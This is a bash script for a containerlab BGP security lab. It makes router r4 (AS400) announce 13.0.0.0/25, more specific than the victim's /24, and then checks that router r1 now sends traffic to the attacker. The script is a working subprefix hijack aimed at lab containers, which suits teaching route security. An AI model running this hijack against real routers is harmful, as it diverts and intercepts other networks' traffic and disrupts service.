#!/bin/bash
set -euo pipefail

LAB="bgp-hijack"; R4="clab-${LAB}-r4"; R1="clab-${LAB}-r1"
BOLD="\033[1m"; RED="\033[31m"; YELLOW="\033[33m"; GREEN="\033[32m"; RESET="\033[0m"

echo -e "${BOLD}================================================${RESET}"
echo -e "${RED}[ATTACK] Subprefix Hijack${RESET}"
echo -e "${BOLD}================================================${RESET}"
echo -e "AS400 announces ${RED}13.0.0.0/25${RESET} — more specific than victim's /24"
echo -e "BGP longest prefix match means /25 wins unconditionally"
echo ""

if ! docker inspect "$R4" >/dev/null 2>&1 || ! docker inspect "$R1" >/dev/null 2>&1; then
  echo -e "${RED}[FAILED]${RESET} Lab containers not running (missing $R1 or $R4)."
  echo -e "Deploy first: ${YELLOW}sudo containerlab deploy -t topology.yaml${RESET}"
  exit 1
fi

# Remove exact hijack if running
docker exec "$R4" vtysh \
  -c "configure terminal" \
  -c "router bgp 400" \
  -c "no network 13.0.0.0/24" \
  -c "end" 2>/dev/null || true

# Remove any existing kernel route for /25
docker exec "$R4" ip route del 13.0.0.0/25 2>/dev/null || true

echo "[1/2] Injecting 13.0.0.0/25 into AS400..."

# Add kernel route first so FRR accepts the network statement
# Use blackhole route inside the container
docker exec "$R4" ip route add blackhole 13.0.0.0/25 2>/dev/null || \
docker exec "$R4" ip route add 13.0.0.0/25 dev lo 2>/dev/null || true

# Now inject into BGP
docker exec "$R4" vtysh \
  -c "configure terminal" \
  -c "router bgp 400" \
  -c "network 13.0.0.0/25" \
  -c "end" \
  -c "write memory"

echo "[2/2] Waiting 15s for BGP convergence..."
sleep 15

echo ""
echo -e "${YELLOW}--- R1 Full BGP Table (both routes should coexist) ---${RESET}"
docker exec "$R1" vtysh -c "show bgp ipv4 unicast"

echo ""
echo -e "${YELLOW}--- Attacker /25 detail ---${RESET}"
docker exec "$R1" vtysh -c "show bgp ipv4 unicast 13.0.0.0/25"

echo ""
echo -e "${YELLOW}--- Victim /24 still present ---${RESET}"
docker exec "$R1" vtysh -c "show bgp ipv4 unicast 13.0.0.0/24"

echo ""
echo -e "${RED}Key: /25 and /24 coexist in table.${RESET}"
echo -e "${RED}Traffic to 13.0.0.0-13.0.0.127   → ATTACKER (longer prefix wins)${RESET}"
echo -e "${RED}Traffic to 13.0.0.128-13.0.0.255 → victim (unaffected)${RESET}"
echo ""
echo -e "${YELLOW}--- R1 Forwarding decision for attacker /25 ---${RESET}"
docker exec "$R1" vtysh -c "show ip route 13.0.0.0/25" || true

if docker exec "$R1" vtysh -c "show ip route 13.0.0.0/25" 2>/dev/null | grep -q "10.14.0.2"; then
  echo -e "${GREEN}[SUCCESS]${RESET} Subprefix hijack succeeded (R1 /25 next-hop is attacker 10.14.0.2)."
  echo -e "${GREEN}Run scripts/stop_attack.sh to restore${RESET}"
  exit 0
else
  echo -e "${RED}[FAILED]${RESET} Subprefix hijack did NOT take over on R1."
  echo -e "${YELLOW}Check:${RESET} docker exec $R1 vtysh -c 'show ip route 13.0.0.0/25'"
  exit 1
fi
echo -e "${BOLD}================================================${RESET}"
